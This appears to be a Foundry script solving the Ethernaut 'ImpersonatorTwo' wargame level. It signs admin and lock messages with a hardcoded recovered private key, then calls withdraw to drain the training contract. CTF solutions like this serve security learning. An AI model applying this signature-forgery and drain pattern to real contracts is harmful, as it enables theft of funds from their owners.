pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "test/openzeppelin-ethernaut/ImpersonatorTwo.t.sol";
import "node_modules/@openzeppelin/contracts/utils/Strings.sol";

contract ImpersonatorTwoScript is Script {
    using Strings for uint256;

    function run() external {
        vm.startBroadcast();

        uint256 recoveredPrivateKey = 0x10a6891de55baf453d66c5faede86eabccf93f3d284540d205f24207670855cc;

        ImpersonatorTwo instance = ImpersonatorTwo(
            vm.envAddress("IMPERSONATOR_TWO")
        );
        address myAddress = vm.envAddress("MY_ADDRESS");
        bytes32 setAdminHash = instance.hash_message(
            string(
                abi.encodePacked(
                    "admin",
                    instance.nonce().toString(),
                    myAddress
                )
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            recoveredPrivateKey,
            setAdminHash
        );
        bytes memory setAdminSignature = abi.encodePacked(r, s, v);

        instance.setAdmin(setAdminSignature, myAddress);

        bytes32 switchLockHash = instance.hash_message(
            string(abi.encodePacked("lock", instance.nonce().toString()))
        );
        (v, r, s) = vm.sign(recoveredPrivateKey, switchLockHash);
        bytes memory switchLockSignature = abi.encodePacked(r, s, v);
        instance.switchLock(switchLockSignature);

        instance.withdraw();
        require(address(instance).balance == 0, "failed");

        vm.stopBroadcast();
    }
}
